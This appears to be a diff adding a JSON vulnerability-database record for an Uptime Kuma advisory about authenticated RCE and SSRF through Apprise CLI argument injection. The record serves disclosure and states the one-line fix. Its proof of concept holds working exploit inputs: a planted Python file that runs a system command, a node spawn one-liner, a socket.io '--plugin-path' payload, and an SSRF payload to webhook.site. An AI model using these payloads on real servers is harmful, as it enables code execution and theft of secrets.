@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-v2p3-6f5h-6hhf",
+  "aliases": [],
+  "title": "Authenticated RCE via Apprise CLI Argument Injection (Missing -- Separator)",
+  "summary": "### Summary\r\n\r\n The Apprise notification provider passes user-controlled appriseURL directly as a CLI argument to spawn(\"apprise\", ...) without a -- separator. Any authenticated user can inject arbitrary CLI flags, including --plugin-path which loads and executes arbitrary Python files. Combined with any file-write primitive, this results in full RCE. Additionally, --config=URL enables authenticated SSRF. Argument injection confirmed on production (--help, --version return success; --config fetches external URLs; --plugin-path scans directories).\r\n\r\n### Details\r\n\r\nIn server/notification-providers/apprise.js lines 13-18:\r\n\r\n    const args = [\"-vv\", \"-b\", msg, notification.appriseURL];\r\n    const s = await childProcessAsync.spawn(\"apprise\", args, { encoding: \"utf8\" });\r\n\r\n  No -- separator before user input. Values starting with - are parsed as CLI flags by Apprise's click argument parser.\r\n\r\n  --plugin-path=DIR scans for .py files and imports them as Python modules. Python executes module-level code at import time - before any notification URL validation. RCE fires even though Apprise exits with \"no URLs\" error.\r\n\r\n  Fix: add \"--\" before notification.appriseURL (one line).\r\n\r\n### Proof of concept\r\n\r\nLocal reproduction (confirmed):\r\n\r\n  mkdir -p /tmp/evil\r\n  echo 'import os;os.system(\"id>/tmp/pwned.txt\")' > /tmp/evil/pwn.py\r\n\r\n  # Simulate exact UK spawn:\r\n  node -e \"require('child_process').spawn('apprise',\r\n    ['-vv','-b','Test','--plugin-path=/tmp/evil'])\r\n    .on('close',()=>console.log(\r\n      require('fs').readFileSync('/tmp/pwned.txt','utf8')))\"\r\n\r\n  Output: uid=1000(sol) gid=1000(sol) groups=1000(sol)\r\n\r\nProduction testing (authorized pentest, UK 2.5.3 Docker):\r\n  appriseURL=\"--help\"    → ok=true \"Sent Successfully\" (flag parsed)\r\n  appriseURL=\"--version\" → ok=true \"Sent Successfully\" (flag parsed)\r\n  appriseURL=\"--config=https://webhook.site/REDACTED\" → Apprise POSTed to URL (SSRF)\r\n  appriseURL=\"--plugin-path=/tmp\" → exit 1, directory scanned\r\n\r\nAutomated PoC via socket.io:\r\n\r\n  sock.emit(\"testNotification\", {\r\n    type: \"apprise\",\r\n    name: \"rce\",\r\n    appriseURL: \"--plugin-path=/tmp/evil\",\r\n  }, callback);\r\n  // RCE executes before callback returns\r\n\r\n\r\n### Impact\r\n\r\nWith any file-write access: full RCE as UK process user. Read database, dump env vars (API keys, DB passwords), reverse shell, container escape if Docker socket mounted, persistent backdoor.\r\n\r\nWithout file-write: authenticated SSRF via --config=URL (confirmed - Apprise fetches arbitrary URLs from server IP).\r\n\r\nThe vulnerability is in the argument parsing, not in Apprise itself. Fix is one line: add \"--\" before user input.",
+  "published_at": "2026-11-02T05:54:44.000Z",
+  "modified_at": "2026-11-02T05:54:44.000Z",
+  "severity": {
+    "level": "high",
+    "score": 8.7,
+    "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:P/VC:H/VI:H/VA:L/SC:H/SI:H/SA:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-88"
+  ],
+  "affected": [
+    {
+      "product": "uptime-kuma",
+      "ranges": [
+        {
+          "introduced": "1.0.6",
+          "fixed": "2.5.8"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-v2p3-6f5h-6hhf",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-v2p3-6f5h-6hhf",
+      "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-v2p3-6f5h-6hhf",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:8aa421cddf6f0abf9d5cf6b21ce488081be0c02b5f2cc4de484ef0fb3e96efc5",
+  "note": null
+}
